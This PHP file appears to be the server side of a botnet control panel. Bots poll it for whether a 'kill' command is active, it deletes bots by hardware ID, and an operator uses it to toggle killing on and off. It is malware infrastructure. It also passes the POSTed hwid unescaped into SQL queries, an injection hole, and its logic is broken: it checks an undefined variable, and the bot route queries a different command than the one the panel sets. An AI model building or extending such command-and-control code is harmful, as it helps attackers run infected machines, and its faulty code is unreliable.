<?php

include('../inc/db.php');

$uri = $_SERVER['REQUEST_URI'];

// Requesting from bot

if(strpos($uri, "request")) {

// tell the bot if it should kill or not
	if(isset($_POST['command'])) {
		
		$user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "newfile"];
		$search_command = DB::query($user_query, $user_data);
		$data = $search_command[0];
		$update = $data['enabled'];

		echo $update;
		
	}

}

if(strpos($uri, "execute")) {

    if(isset($_POST['hwid'])) {

        $hwid = $_POST['hwid'];
	
        $q = "DELETE FROM `bots` WHERE `hwid` = '$hwid'";
        $exe = DB::query($q);

        // Checking if it was actually removed

        $result = $db->prepare("SELECT SQL_CALC_FOUND_ROWS `id` FROM `bots` WHERE `hwid` = '$hwid'"); 
        $result->execute();
        $result = $db->prepare("SELECT FOUND_ROWS()"); 
        $result->execute();
        $row_count = $result->fetchColumn();
        $total = $row_count;
        
        if($exists == 0) {
            echo "continue";
        } else {
            echo "not deleted";
        }

    }

}


// Recieving from panel

if(strpos($uri, "panel")) {

	if(isset($_POST['enabled'])) {

		$shouldkill = $_POST['enabled'];

		if($shouldkill == "true") {

			$query = "UPDATE commands SET enabled='true' WHERE command=:command";
			$qd = [':command' => "kill"];
			$search_command = DB::query($query, $qd);

			echo "started killing";

		} else if($shouldkill == "false") {

			$query = "UPDATE commands SET enabled='false' WHERE command=:command";
			$qd = [':command' => "kill"];
			$search_command = DB::query($query, $qd);

			echo "stopped killing";

		} else {

			$query = "UPDATE commands SET enabled='false' WHERE command=:command";
			$qd = [':command' => "kill"];
			$search_command = DB::query($query, $qd);

			echo "Error killing";
		}

	}

}



?>